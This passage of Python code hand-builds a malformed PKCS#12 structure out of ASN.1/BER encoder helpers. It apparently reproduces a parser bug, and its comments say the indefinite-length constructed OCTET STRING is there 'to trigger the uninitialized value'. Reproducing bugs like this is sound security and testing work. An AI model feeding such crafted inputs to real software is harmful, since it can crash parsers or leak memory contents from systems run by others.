string(data, constructed=False):\n    if constructed:\n        tag = encode_tag(0x00, True, 0x04)  # UNIVERSAL, CONSTRUCTED, OCTET STRING\n    else:\n        tag = encode_tag(0x00, False, 0x04)  # UNIVERSAL, PRIMITIVE, OCTET STRING\n    length = encode_length(len(data))\n    return tag + length + data\n\ndef encode_octet_string_indefinite(inner_parts):\n    """Encode a constructed OCTET STRING with indefinite length"""\n    tag = encode_tag(0x00, True, 0x04)  # UNIVERSAL, CONSTRUCTED, OCTET STRING\n    indefinite_length = b\'\\x80\'\n    eoc = b\'\\x00\\x00\'\n    inner = b\'\'.join(inner_parts)\n    return tag + indefinite_length + inner + eoc\n\ndef encode_context_explicit(tag_number, contents):\n    tag = encode_tag(0x80, True, tag_number)  # CONTEXT-SPECIFIC, CONSTRUCTED\n    length = encode_length(len(contents))\n    return tag + length + contents\n\ndef encode_oid(oid_string):\n    """Encode an OID string like \'1.2.840.113549.1.7.1\'"""\n    parts = [int(x) for x in oid_string.split(\'.\')]\n    encoded = struct.pack(\'BB\', parts[0] * 40 + parts[1])\n    for p in parts[2:]:\n        if p < 128:\n            encoded += struct.pack(\'B\', p)\n        else:\n            bytes_list = []\n            while p > 0:\n                bytes_list.insert(0, p & 0x7F)\n                p >>= 7\n            for i, b in enumerate(bytes_list):\n                if i < len(bytes_list) - 1:\n                    encoded += struct.pack(\'B\', b | 0x80)\n                else:\n                    encoded += struct.pack(\'B\', b)\n    return encoded\n\ndef encode_integer(value):\n    tag = encode_tag(0x00, False, 0x02)  # UNIVERSAL, PRIMITIVE, INTEGER\n    if value == 0:\n        data = b\'\\x00\'\n    elif value < 0x80:\n        data = struct.pack(\'B\', value)\n    elif value < 0x8000:\n        data = struct.pack(\'>H\', value)\n    else:\n        data = struct.pack(\'>I\', value)\n    length = encode_length(len(data))\n    return tag + length + data\n\n# OIDs\nDATA_OID = encode_oid(\'1.2.840.113549.1.7.1\')  # data\nBAG_CERTIFICATE_OID = encode_oid(\'1.2.840.113549.1.12.10.1.3\')  # cert bag\n\n# Build the inner SafeContents with a BER-encoded constructed OCTET STRING\n# that will trigger the uninitialized value\n\n# Create a SafeBag with a certificate bag type\n# SafeBag ::= SEQUENCE {\n#   bagId BAG-TYPE.&id ({PKCS12BagSet}),\n#   bagValue [0] EXPLICIT BAG-TYPE.&Type({PKCS12BagSet}{@bagId}),\n#   bagAttributes SET OF PKCS12Attribute OPTIONAL\n# }\n\n# The bagValue for a certificate bag is a CertBag\n# CertBag ::= SEQUENCE {\n#   certId BAG-TYPE.&id ({CertTypes}),\n#   certValue [0] EXPLICIT BAG-TYPE.&Type({CertTypes}{@certId})\n# }\n\n# Create a minimal CertBag\ncert_id = encode_oid(\'1.2.840.113549.1.9.22.1\')  # x509Certificate\n# The certValue should be an OCTET STRING containing the certificate\n# But we\'ll make it minimal\ncert_value = encode_octet_string(b\'\\x00\\x01\\x02\\x03\')\ncert_bag_content = encode_sequence(cert_id + encode_context_explicit(0, cert_value))\ncert_bag = encode_sequence(\n    BAG_CERTIFICATE_OID +\n    encode_context_explicit(0, cert_bag_content)\n)\n\n# Encode SafeContents as a SEQUENCE OF SafeBag\nsafe_contents = encode_sequence(cert_bag)\n\n# Now encode the AuthenticatedSafe\n# AuthenticatedSafe ::= SEQUENCE OF ContentInfo\n# ContentInfo ::= SEQUENCE {\n#   contentType ContentType,\n#   content [0] EXPLICIT ANY DEFINED BY contentType OPTIONAL\n# }\n\n# For the content, we use a BER-encoded constructed OCTET STRING with indefinite length\n# that contains the SafeContents\n# This is the key: use a constructed OCTET STRING with indefinite length\n# to trigger the BER decoding path\n\n# First, encode the SafeContents as a primitive OCTET STRING\nsafe_contents_der = encode_octet_string(safe_contents)\n\n# Then wrap it in a constructed OCTET STRING with indefinite length\n# This creates a nested structure that triggers the BER decoding\ncontent_ber = encode_octet_string_indefinite([safe_contents_der])\n\n# Crea